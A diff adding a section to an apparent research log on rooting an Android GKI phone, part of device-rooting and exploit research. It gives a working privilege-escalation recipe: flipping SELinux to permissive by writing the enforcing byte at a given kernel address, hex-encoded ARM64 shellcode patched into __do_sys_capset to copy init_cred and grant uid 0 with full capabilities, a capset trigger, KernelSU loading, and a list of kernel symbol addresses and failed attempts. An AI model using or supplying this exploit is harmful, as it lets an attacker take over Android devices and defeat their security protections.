@@ -77,3 +77,58 @@ This device is a GKI variant (`AI2202`, `VARIANT=gki`), so KMI `android12-5.10` 
 
 Not yet attempted on hardware: our temporary root needs a fully reliable kernel-text patch first
 (see `ROADMAP.md` §5b/§6), because `ksud late-load` must run from a *stable* rooted session.
+
+
+## Round 8 (verified 2026-09-17): USABLE root + KernelSU early-late-load
+
+Temporary root is now *usable*, and the KernelSU LKM loads. Recipe, in order:
+
+1. **Permissive** — clear BYTE 0 of `selinux_state` (`0xaaa40b98`): the byte IS `enforcing` (byte 1 is
+   `checkreqprot`; clearing byte 1 does nothing — that was the first mistake). Hot data does not take a
+   device store every time: it needed 5 attempts before `getenforce` flipped to `Permissive`. The oracle
+   is the kernel's own `getenforce`, never our readback.
+2. **Root** — 16-dword shellcode in place at `__do_sys_capset` (`0xa8145af0`, cold syscall; all
+   encodings PC-relative => slide-independent, no runtime literals, no cave):
+   `stp x29,x30 / str x19 / bl prepare_creds / cbz / mov x19,x0 / add x0,x19,#4 /
+    adrp x1,<init_cred page> / add x1,x1,#0xae4 / mov w2,#0x4c / bl memcpy / mov x0,x19 /
+    bl commit_creds / mov w0,wzr / ldr x19 / ldp / ret`
+   i.e. copy `init_cred+4 .. +0x50` (all eight ids, securebits, all five cap sets) into a
+   `prepare_creds()` copy of OUR cred. `security` sits far beyond +0x50, so **our SELinux SID is kept**.
+   Result: `uid=0 euid=0 gid=0`, `CapEff 000001ffffffffff`, `context=u:r:shell:s0`.
+   Dwords: `a9be7bfd f9000bf3 9400faa2 b4000140 aa0003f3 91001260 f0013341 912b9021 52800982
+   97fb66db aa1303e0 9400fc5e 2a1f03e0 f9400bf3 a8c27bfd d65f03c0`.
+3. **Trigger** — any `capset()` call (`/data/local/tmp/call_capset`).
+
+### What that unlocked (measured, same run)
+
+| op as the rooted process | before (Enforcing) | now |
+|---|---|---|
+| write `/data/local/tmp` | DENIED | **OK** |
+| write `/sdcard` (FUSE) | DENIED | **OK** |
+| read `/proc/kallsyms` | DENIED | **OK** (`_text` visible; values 0 until `kptr_restrict=0`) |
+| list `/data/data` | DENIED | **OK** |
+| write proof page | DENIED | **OK** |
+| `init_module` | EPERM | **ENOEXEC = permitted** |
+
+### KernelSU
+
+`ksud late-load --kmi android12-5.10 --allow-shell` (tiann v3.3.0, `ksud-aarch64-linux-android`,
+`lkm-aarch64-android12-5.10_kernelsu.ko` sha256 `5ca70d239f955139db23cd3028e578975cd038a7f2dc5f54ab4498a13f7ce03a`):
+
+```
+kernelsu 200704 0 - Live 0x0000000000000000 (O)
+```
+
+The module loads. Still open at the time of writing: ksud's userspace stages (`/data/adb/ksud` came back
+`Permission denied`, `ksud.log` empty - likely the permissive flip reverting under vendor services
+mid-session), verifying `su`, and installing the manager APK.
+
+### Negative results (do not retry these)
+
+* `commit_creds(&init_cred)` => uid 0 in the **kernel** domain: every userspace op denied.
+* `avc_has_perm` text patch: it is **hot**, the patched entry is often never seen => ineffective.
+* `avc_denied` (`0xa88ba524`) patch: lands and verifies, changes nothing (it only gates the audit /
+  EACCES conversion, not the decision), and the device rebooted soon after.
+* `avc_has_perm_noaudit 0xa88bb5d8`; `prepare_creds 0xa8184580`; `memcpy 0xa801f680`;
+  `commit_creds 0xa8184c94`; `init_cred 0xaa7b0ae0`; `selinux_state 0xaaa40b98`; cave `0xa801c7e4`
+  (7 NOP dwords only - too small for shellcode, fine for the 2-dword `mov w0,wzr; ret` gadget).
